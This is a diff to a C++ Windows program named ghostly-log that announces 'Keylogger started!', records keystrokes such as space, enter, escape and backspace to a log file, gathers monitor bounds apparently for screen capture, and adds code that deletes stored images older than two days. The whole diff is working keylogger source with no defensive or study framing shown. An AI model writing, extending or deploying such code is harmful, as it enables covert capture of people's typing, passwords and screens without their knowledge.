@@ -1,4 +1,4 @@
-// ghostly-log.cpp : This file contains the 'main' function. Program execution begins and ends there.
+﻿// ghostly-log.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 
 #include <iostream>
@@ -6,6 +6,13 @@
 #include "gdiplus.h"
 #include "cstring"
 #include <conio.h>
+#include <chrono>
+#include <ctime>
+#include <stdio.h>
+#include <time.h>
+#include <Windows.h>
+#include <cstdio>
+#include <filesystem>
 
 int topLeftX = -1;
 int topLeftY = -1;
@@ -24,19 +31,39 @@ BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor,
 		if (topLeftX == -1 && topLeftY == -1) {
 			topLeftX = info.rcMonitor.left;
 			topLeftY = info.rcMonitor.top;
-			return TRUE;
 		}
-		else {
-			botRightX = info.rcMonitor.right;
-			botRightY = info.rcMonitor.bottom;
-			return TRUE;
-		}
+		botRightX = info.rcMonitor.right;
+		botRightY = info.rcMonitor.bottom;
 	}
 	return TRUE;  // continue enumerating
 }
 
 int main()
 {
+	// Set the number of days to keep pictures
+	const int numDaysToKeep = 2;
+
+	// Get the current time
+	std::time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+
+	// Iterate through all the files in the directory
+	for (const auto& entry : std::filesystem::directory_iterator("./images")) {
+		// Get the modified date of the file
+		const auto modifiedTime = std::filesystem::last_write_time(entry);
+		const auto systemTime = std::chrono::clock_cast<std::chrono::system_clock>(modifiedTime);
+
+		// Convert the modified time to a time_t object
+		const auto modifiedTime_t = std::chrono::system_clock::to_time_t(systemTime);
+
+		// Calculate the age of the file in days
+		double ageInDays = difftime(currentTime, modifiedTime_t) / (60 * 60 * 24);
+
+		// If the file is older than the specified number of days, delete it
+		if (ageInDays > numDaysToKeep) {
+			std::filesystem::remove(entry);
+		}
+	}
+
 	FileOutput logger;
 	std::cout << "Keylogger started!\n";
 	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
@@ -77,6 +104,7 @@ int main()
 				case VK_SPACE: logger.log("<SPACE>"); break;
 				case VK_RETURN: logger.log("<ENTER>"); break;
 				case VK_TAB: logger.log("<TAB>"); break;
+				case VK_ESCAPE: logger.log("<ESCAPE>"); break;
 				case VK_BACK: logger.log("<BACKSPACE>"); break;
 				case VK_DELETE: logger.log("<DELETE>"); break;
 				case VK_RSHIFT: logger.log("<RSHIFT>"); break;
